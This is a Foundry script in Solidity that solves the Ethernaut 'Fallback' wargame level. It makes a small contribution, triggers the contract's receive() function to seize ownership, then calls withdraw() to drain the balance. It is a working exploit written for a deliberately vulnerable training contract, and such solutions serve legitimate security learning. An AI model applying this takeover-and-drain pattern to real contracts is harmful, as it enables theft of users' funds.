// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Fallback} from "../../challenge-contracts/01-Fallback.sol";

contract FallbackSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // Ric Li C's Solution
        Fallback challenge = Fallback(payable(challengeInstance));

        // 1. Get balance of calling address, make sure it has enough ether before calling
        address heroAddress = vm.addr(heroPrivateKey);
        uint256 balance = address(heroAddress).balance;
        console2.log("Balance of address:", heroAddress, "is", balance);

        // 2. Call contribute() function to make `contributions[msg.sender] > 0`;
        challenge.contribute{value: 0.0008 ether}();

        // 3. Send ether to invoke `receive()` function;
        // Since `receive()` function has extra logic, gas MUST be increased to make transfer successfully.
        (bool success, ) = challengeInstance.call{
            value: 0.001 ether,
            gas: 300000
        }("");
        require(success, "Transfer failed");

        // 4. Confirm that `heroAddress` have become owner of the contract.
        // assertEq(heroAddress, challenge.owner(), "Owner check failed");  // assertEq is only available in test scripts
        require(heroAddress == challenge.owner(), "Owner check failed");

        // 5. Drain contract balance.
        challenge.withdraw();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(1));
    }
}
